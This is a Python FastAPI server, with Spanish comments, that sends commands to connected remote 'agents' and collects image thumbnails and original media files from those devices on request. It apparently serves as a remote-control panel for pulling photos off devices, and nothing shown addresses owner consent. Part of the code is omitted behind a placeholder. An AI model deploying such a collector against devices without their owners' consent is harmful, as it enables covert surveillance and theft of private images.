import json
import base64
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any

app = FastAPI(title="Agente Control Backend (Subida Bajo Demanda)")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA MEJORADA ---
# Ahora la caché puede guardar la miniatura y, opcionalmente, el original
# Formato: { "device_id": { "filename.jpg": { "small_thumb_b64": "...", "original_b64": "..." } } }
device_media_cache: Dict[str, Dict[str, Dict[str, str]]] = {}

# --- MODELOS DE DATOS SIMPLIFICADOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str = ""

class Thumbnail(BaseModel):
    filename: str
    # La app solo envía la miniatura pequeña inicialmente
    small_thumb_b64: str

class ThumbnailChunk(BaseModel):
    thumbnails: List[Thumbnail]
    is_final_chunk: bool

# --- ENDPOINTS (WebSocket y de Agentes sin cambios) ---
# ... (Tu @app.websocket y @app.get("/api/get-agents") se quedan igual) ...

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    agent = connected_agents.get(command.target_id)
    if not agent:
        return {"status": "error", "message": "Agente no conectado"}

    if command.action == "get_thumbnails":
        print(f"Limpiando caché antigua para {command.target_id[:8]}.")
        device_media_cache[command.target_id] = {}

    try:
        await agent["ws"].send_text(command.json())
        return {"status": "success", "message": "Comando enviado"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
    if device_id not in device_media_cache:
        device_media_cache[device_id] = {}
    
    for thumb in chunk.thumbnails:
        # Solo guardamos la miniatura pequeña por ahora
        device_media_cache[device_id][thumb.filename] = {"small_thumb_b64": thumb.small_thumb_b64}
    
    print(f"Recibidas {len(chunk.thumbnails)} miniaturas de {device_id[:8]}.")
    return {"status": "chunk received"}

# --- ¡NUEVA RUTA PARA RECIBIR EL ARCHIVO ORIGINAL! ---
@app.post("/api/upload_original_file/{device_id}/{filename:path}")
async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
    if device_id not in device_media_cache or filename not in device_media_cache[device_id]:
        return {"status": "error", "message": "Archivo no solicitado o agente desconocido"}
    
    # Leemos los bytes del archivo y los convertimos a Base64
    file_bytes = await file.read()
    original_b64 = base64.b64encode(file_bytes).decode('utf-8')

    # Guardamos la imagen original en la caché, junto a su miniatura
    device_media_cache[device_id][filename]['original_b64'] = original_b64
    
    print(f"Recibido archivo original '{filename}' de {device_id[:8]}.")
    return {"status": "success", "message": "Archivo original recibido"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    # La respuesta es la misma: una lista de miniaturas
    return device_media_cache.get(device_id, {})

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(filename)
    
    # Ahora buscamos el campo 'original_b64'
    if not media_item or 'original_b64' not in media_item:
        return Response(content='{"detail":"Archivo original no disponible en el servidor"}', status_code=404)
    
    try:
        image_bytes = base64.b64decode(media_item['original_b64'])
        return Response(content=image_bytes, media_type="image/jpeg")
    except Exception as e:
        return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500)
